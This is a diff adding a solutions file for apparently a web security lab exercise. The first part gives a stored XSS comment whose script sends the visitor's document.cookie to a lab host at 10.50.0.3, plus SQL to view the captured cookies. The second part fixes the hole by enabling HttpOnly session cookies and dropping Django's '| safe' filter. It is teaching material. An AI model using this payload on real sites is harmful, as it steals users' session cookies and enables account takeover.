@@ -1,0 +1,31 @@
+Solution to Exercise "XSS to Send Cookies to an Attacker"
+---------------------------------------------------------
+
+Enter the following as the comment
+Nice coffee
+<script>
+var i = document.createElement("img");
+i.src = "http://10.50.0.3/cookies/" + document.cookie;
+</script>
+
+
+In the database (sudo -u postgres psql csthirdparty):
+select * from csthirdparty_cookies;
+
+To clean up
+delete from csthirdparty_cookies;
+
+
+Solution to Exercise Fixing the XSS Vulnerability
+-------------------------------------------------
+
+1. In settings.py, change
+   SESSION_COOKIE_HTTPONLY = False
+   to
+   SESSION_COOKIE_HTTPONLY = True
+
+2. In product.html, change
+   {{ comment.comment | safe }}
+   to
+   {{ comment.comment }}
+
